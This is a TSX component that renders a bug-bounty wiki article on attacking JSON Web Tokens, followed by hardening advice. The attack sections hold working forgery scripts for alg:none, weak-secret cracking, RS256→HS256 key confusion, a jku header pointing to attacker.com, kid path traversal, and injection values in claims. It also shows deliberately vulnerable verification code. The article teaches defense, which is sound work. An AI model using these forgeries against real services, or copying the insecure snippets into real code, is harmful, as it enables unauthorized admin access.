/**
 * JWT VULNERABILITIES
 * Exploiting poorly implemented JSON Web Tokens
 */

import { ReactNode } from 'react';
import {
  Section,
  Subsection,
  Paragraph,
  Strong,
  InlineCode,
  AlertInfo,
  AlertWarning,
  AlertDanger,
  AlertTip,
  CodeBlock,
  TerminalOutput,
  HighlightBox,
  ListItem
} from '@/components/WikiArticleComponents';
import { Key, Lock, Shield, AlertTriangle, ArrowRight } from 'lucide-react';
import Link from 'next/link';

interface ArticleContentProps {
  locale: string;
}

export default function JWTVulnerabilitiesContentEN({ locale }: ArticleContentProps): ReactNode {
  return (
    <>
      <Section id="introduction" title="JWT - The Most Used (and Abused) Token">
        <Paragraph>
          <Strong>JSON Web Tokens (JWT)</Strong> are the de facto standard for authentication in modern APIs. 
          A typical JWT has 3 parts: <InlineCode>header.payload.signature</InlineCode>. 
          Vulnerabilities arise when developers trust the content without validating the signature.
        </Paragraph>

        <AlertDanger title="Common Vulnerabilities">
          <ul className="mt-2 space-y-1">
            <ListItem>🔓 Algorithm confusion (alg: none)</ListItem>
            <ListItem>🔑 Weak secret keys (brute force)</ListItem>
            <ListItem>🎭 Key confusion (RS256 → HS256)</ListItem>
            <ListItem>📝 JWT claims manipulation</ListItem>
            <ListItem>⏰ Lack of exp/iat validation</ListItem>
            <ListItem>🔐 JWK injection</ListItem>
          </ul>
        </AlertDanger>

        <HighlightBox color="blue">
          <Strong>JWT Structure:</Strong>
          <CodeBlock
            language="text"
            code={`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEyMywiYWRtaW4iOmZhbHNlfQ.signature
  ↑ Header (Base64)            ↑ Payload (Base64)      ↑ Signature

Decoded Header:  {"alg":"HS256","typ":"JWT"}
Decoded Payload: {"userId":123,"admin":false}`}
          />
        </HighlightBox>
      </Section>

      <Section id="alg-none" title="1. Algorithm None Attack">
        <Paragraph>
          The most famous vulnerability: change the algorithm to <InlineCode>"none"</InlineCode> 
          and remove the signature.
        </Paragraph>

        <Subsection title="Vulnerable Code">
          <CodeBlock
            language="javascript"
            title="Node.js - Insecure verification"
            code={`const jwt = require('jsonwebtoken');

app.post('/api/admin', (req, res) => {
  const token = req.headers.authorization?.split(' ')[1];
  
  // ❌ VULNERABLE - verify() without strict options
  const decoded = jwt.verify(token, SECRET_KEY);
  
  if (decoded.admin === true) {
    res.json({ message: 'Welcome admin!', data: secretData });
  }
});`}
          />
        </Subsection>

        <Subsection title="Exploit - Change alg to 'none'">
          <CodeBlock
            language="python"
            title="Python - Generate JWT without signature"
            code={`import base64
import json

# Create header with alg=none
header = {
    "alg": "none",
    "typ": "JWT"
}

# Create payload with admin=true
payload = {
    "userId": 123,
    "admin": True,  # ← Privilege escalation
    "exp": 9999999999
}

# Encode to Base64
header_b64 = base64.urlsafe_b64encode(
    json.dumps(header).encode()
).decode().rstrip('=')

payload_b64 = base64.urlsafe_b64encode(
    json.dumps(payload).encode()
).decode().rstrip('=')

# JWT without signature (ends with .)
fake_token = f"{header_b64}.{payload_b64}."

print(fake_token)
# eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOjEyMywiYWRtaW4iOnRydWV9.`}
          />

          <TerminalOutput title="Use fake token">
            {`curl -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOjEyMywiYWRtaW4iOnRydWV9." \\
  https://target.com/api/admin

Response:
{
  "message": "Welcome admin!",
  "data": { ... }  ← Admin access without password!
}`}
          </TerminalOutput>
        </Subsection>
      </Section>

      <Section id="weak-secret" title="2. Weak Secret Key (Brute Force)">
        <Paragraph>
          Many apps use weak secrets like <InlineCode>"secret"</InlineCode>, 
          <InlineCode>"password123"</InlineCode>, or the company name.
        </Paragraph>

        <CodeBlock
          language="bash"
          title="Hashcat - Crack JWT signature"
          code={`# Install hashcat
sudo apt install hashcat

# Save JWT to file
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEyM30.YjE2ZTk4ODY..." > jwt.txt

# Crack with wordlist
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# If secret is found:
# Hashcat status: Cracked
# Secret: password123`}
        />

        <Subsection title="Generate JWT with Cracked Secret">
          <CodeBlock
            language="javascript"
            title="Node.js - Sign JWT with stolen secret"
            code={`const jwt = require('jsonwebtoken');

// Secret discovered with hashcat
const CRACKED_SECRET = 'password123';

// Create token with admin privileges
const maliciousToken = jwt.sign(
  {
    userId: 999,
    username: 'hacker',
    admin: true,
    role: 'superadmin'
  },
  CRACKED_SECRET,
  {
    algorithm: 'HS256'
  }
);

console.log(maliciousToken);`}
          />
        </Subsection>

        <AlertTip title="jwt_tool">
          Use <Strong>jwt_tool</Strong> for automated testing:
          <CodeBlock
            language="bash"
            code={`git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
python3 jwt_tool.py <JWT>

# Useful options:
# -C -d wordlist.txt  → Brute force
# -X a                → All attacks
# -T                  → Tamper payload`}
          />
        </AlertTip>
      </Section>

      <Section id="key-confusion" title="3. Algorithm Confusion (RS256 → HS256)">
        <Paragraph>
          Applications using <Strong>RS256 (asymmetric)</Strong> can be vulnerable 
          if an attacker changes the algorithm to <Strong>HS256 (symmetric)</Strong> and signs 
          with the public key as the secret.
        </Paragraph>

        <Subsection title="How Does It Work?">
          <HighlightBox color="red">
            <Strong>RS256:</Strong> Sign with private key, verify with public key<br/>
            <Strong>HS256:</Strong> Sign and verify with the same secret key<br/><br/>
            <Strong>Attack:</Strong> Change alg to HS256 and use the public key (known) as secret
          </HighlightBox>
        </Subsection>

        <Subsection title="Exploit Step-by-Step">
          <CodeBlock
            language="bash"
            title="1. Obtain public key from server"
            code={`# Many apps expose the public key at /jwks.json or /.well-known/jwks.json
curl https://target.com/.well-known/jwks.json

# Or extract from JWT if it has 'kid' header
# Or from SSL certificate`}
          />

          <CodeBlock
            language="python"
            title="2. Generate JWT signed with public key"
            code={`import jwt

# Public key obtained from server (PEM format)
public_key = """
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END PUBLIC KEY-----
"""

# Create malicious payload
payload = {
    "userId": 123,
    "admin": True,
    "role": "superadmin"
}

# ❌ Sign with HS256 using the PUBLIC KEY as secret
malicious_token = jwt.encode(
    payload,
    public_key,
    algorithm='HS256'
)

print(malicious_token)`}
          />

          <AlertWarning>
            If the server doesn't strictly validate the expected algorithm, 
            it will accept the token signed with HS256.
          </AlertWarning>
        </Subsection>
      </Section>

      <Section id="claims-manipulation" title="4. JWT Claims Manipulation">
        <Subsection title="Modify Payload Without Breaking Signature">
          <Paragraph>
            Some claims can be manipulated if the app doesn't validate them correctly:
          </Paragraph>

          <CodeBlock
            language="json"
            title="Original payload"
            code={`{
  "userId": 123,
  "username": "normal_user",
  "role": "user",
  "exp": 1735689600
}`}
          />

          <CodeBlock
            language="json"
            title="Manipulation attempts"
            code={`// 1. Change userId (if app doesn't validate against session)
{"userId": 1}  // ← Admin's ID

// 2. Remove expiration
// Omit the "exp" claim completely

// 3. Change to far future
{"exp": 9999999999}

// 4. Inject additional claims
{"userId": 123, "admin": true}

// 5. SQL injection in claims
{"username": "admin'--"}

// 6. Prototype pollution (Node.js)
{"__proto__": {"admin": true}}`}
          />
        </Subsection>

        <Subsection title="Real Exploit: exp Claim Bypass">
          <CodeBlock
            language="javascript"
            title="Vulnerable code - Doesn't validate exp"
            code={`app.use((req, res, next) => {
  const token = req.headers.authorization?.split(' ')[1];
  
  try {
    // ❌ VULNERABLE - verify without validating exp
    const decoded = jwt.verify(token, SECRET, {
      algorithms: ['HS256'],
      ignoreExpiration: true  // ← DANGER!
    });
    
    req.user = decoded;
    next();
  } catch (err) {
    res.status(401).json({ error: 'Invalid token' });
  }
});`}
          />

          <AlertDanger>
            With <InlineCode>ignoreExpiration: true</InlineCode>, expired tokens remain valid.
          </AlertDanger>
        </Subsection>
      </Section>

      <Section id="jwk-injection" title="5. JWK Injection (jku/kid abuse)">
        <Paragraph>
          JWT can include a <InlineCode>jku</InlineCode> header (JWK Set URL) that points 
          to a server with public keys. An attacker can inject their own URL.
        </Paragraph>

        <CodeBlock
          language="json"
          title="Malicious header with jku"
          code={`{
  "alg": "RS256",
  "typ": "JWT",
  "jku": "https://attacker.com/evil_jwks.json"  // ← Attacker's URL
}`}
        />

        <CodeBlock
          language="json"
          title="evil_jwks.json on attacker's server"
          code={`{
  "keys": [
    {
      "kty": "RSA",
      "kid": "attacker-key",
      "use": "sig",
      "n": "0vx7agoebGcQ...",  // ← Attacker's public key
      "e": "AQAB"
    }
  ]
}`}
        />

        <Paragraph>
          If the vulnerable server fetches from <InlineCode>jku</InlineCode> without validating 
          the domain, it will download the attacker's public key and validate the signature correctly.
        </Paragraph>

        <Subsection title="kid (Key ID) Injection">
          <CodeBlock
            language="json"
            title="Path traversal via kid"
            code={`// Header with malicious kid
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "../../../../../../dev/null"  // ← Path traversal
}

// If the server does: readFileSync(kid)
// Will read /dev/null (empty) and use empty string as secret`}
          />

          <CodeBlock
            language="python"
            title="Generate JWT with kid injection"
            code={`import jwt

payload = {"userId": 123, "admin": True}

# Sign with empty string (because kid points to /dev/null)
token = jwt.encode(
    payload,
    "",  # Empty secret
    algorithm="HS256",
    headers={"kid": "../../../../../../dev/null"}
)

print(token)`}
          />
        </Subsection>
      </Section>

      <Section id="mitigation" title="Complete Mitigation">
        <AlertDanger title="✅ Secure JWT Configuration">
          Implement ALL of these validations.
        </AlertDanger>

        <Subsection title="1. Strict Algorithm Validation">
          <CodeBlock
            language="javascript"
            title="✅ SECURE - Force specific algorithm"
            code={`const jwt = require('jsonwebtoken');

// ✅ Whitelist of allowed algorithms
const ALLOWED_ALGORITHMS = ['HS256'];

app.use((req, res, next) => {
  const token = req.headers.authorization?.split(' ')[1];
  
  try {
    // ✅ SECURE - Specify allowed algorithms
    const decoded = jwt.verify(token, SECRET_KEY, {
      algorithms: ALLOWED_ALGORITHMS,  // ← Only HS256
      complete: true  // Returns header + payload
    });
    
    // ✅ Validate algorithm in header
    if (!ALLOWED_ALGORITHMS.includes(decoded.header.alg)) {
      throw new Error('Invalid algorithm');
    }
    
    req.user = decoded.payload;
    next();
    
  } catch (err) {
    res.status(401).json({ error: 'Invalid token' });
  }
});`}
          />
        </Subsection>

        <Subsection title="2. Strong Secret Key">
          <CodeBlock
            language="javascript"
            title="✅ Generate cryptographically secure secret"
            code={`const crypto = require('crypto');

// ✅ SECURE - 256 bits of entropy
const SECRET_KEY = crypto.randomBytes(32).toString('hex');

// Save in environment variable
// .env
JWT_SECRET=a7f8d9e6c5b4a3f2e1d0c9b8a7f6e5d4c3b2a1f0e9d8c7b6a5f4e3d2c1b0a9f8

// Never hardcode in code:
// ❌ const SECRET = 'mysecret';
// ❌ const SECRET = 'MyApp2024';`}
          />
        </Subsection>

        <Subsection title="3. Validate ALL Critical Claims">
          <CodeBlock
            language="javascript"
            title="✅ SECURE - Exhaustive validation"
            code={`const jwt = require('jsonwebtoken');

function validateToken(token) {
  try {
    const decoded = jwt.verify(token, SECRET_KEY, {
      algorithms: ['HS256'],
      
      // ✅ Validate expiration (default: true)
      ignoreExpiration: false,
      
      // ✅ Clock tolerance (5 seconds)
      clockTolerance: 5,
      
      // ✅ Verify audience
      audience: 'https://myapp.com',
      
      // ✅ Verify issuer
      issuer: 'https://auth.myapp.com',
      
      // ✅ Max age (30 days)
      maxAge: '30d'
    });
    
    // ✅ Additional validations
    if (!decoded.userId || typeof decoded.userId !== 'number') {
      throw new Error('Invalid userId claim');
    }
    
    if (decoded.admin && !isValidAdmin(decoded.userId)) {
      throw new Error('Invalid admin claim');
    }
    
    return decoded;
    
  } catch (err) {
    throw new Error(\`Token validation failed: \${err.message}\`);
  }
}`}
          />
        </Subsection>

        <Subsection title="4. Use RS256 for Production">
          <CodeBlock
            language="javascript"
            title="✅ SECURE - Asymmetric algorithm"
            code={`const fs = require('fs');
const jwt = require('jsonwebtoken');

// ✅ Generate RSA key pair
// openssl genrsa -out private.pem 2048
// openssl rsa -in private.pem -pubout -out public.pem

const PRIVATE_KEY = fs.readFileSync('private.pem');
const PUBLIC_KEY = fs.readFileSync('public.pem');

// Generate token (only in auth server)
function generateToken(userId) {
  return jwt.sign(
    {
      userId,
      iat: Math.floor(Date.now() / 1000),
      exp: Math.floor(Date.now() / 1000) + (60 * 60), // 1 hour
    },
    PRIVATE_KEY,
    {
      algorithm: 'RS256',
      issuer: 'auth.myapp.com',
      audience: 'api.myapp.com'
    }
  );
}

// Verify token (in API servers)
function verifyToken(token) {
  return jwt.verify(token, PUBLIC_KEY, {
    algorithms: ['RS256'],  // ← Only RS256, rejects HS256
    issuer: 'auth.myapp.com',
    audience: 'api.myapp.com'
  });
}`}
          />
        </Subsection>

        <Subsection title="5. Token Blacklist (Logout)">
          <CodeBlock
            language="javascript"
            title="✅ Redis blacklist for invalidated tokens"
            code={`const Redis = require('ioredis');
const redis = new Redis();

// Logout: add token to blacklist
async function logout(token) {
  const decoded = jwt.decode(token);
  const ttl = decoded.exp - Math.floor(Date.now() / 1000);
  
  // Save in Redis with TTL = remaining token time
  await redis.set(
    \`blacklist:\${token}\`,
    '1',
    'EX',
    ttl
  );
}

// Middleware: check blacklist
async function checkBlacklist(req, res, next) {
  const token = req.headers.authorization?.split(' ')[1];
  
  const isBlacklisted = await redis.exists(\`blacklist:\${token}\`);
  
  if (isBlacklisted) {
    return res.status(401).json({ error: 'Token has been revoked' });
  }
  
  next();
}`}
          />
        </Subsection>
      </Section>

      <div className="mt-12 pt-8 border-t border-slate-200 dark:border-slate-800">
        <h3 className="text-2xl font-bold text-slate-900 dark:text-white mb-4">Next: OAuth Attacks</h3>
        <Link
          href={`/${locale}/wiki/bug-bounty/oauth-attacks`}
          className="group inline-flex items-center gap-3 px-6 py-4 bg-gradient-to-r from-orange-600 to-red-600 text-white rounded-xl font-semibold hover:shadow-xl hover:shadow-orange-500/50 transition-all"
        >
          <span>Exploiting poorly implemented OAuth flows</span>
          <ArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
        </Link>
      </div>
    </>
  );
}
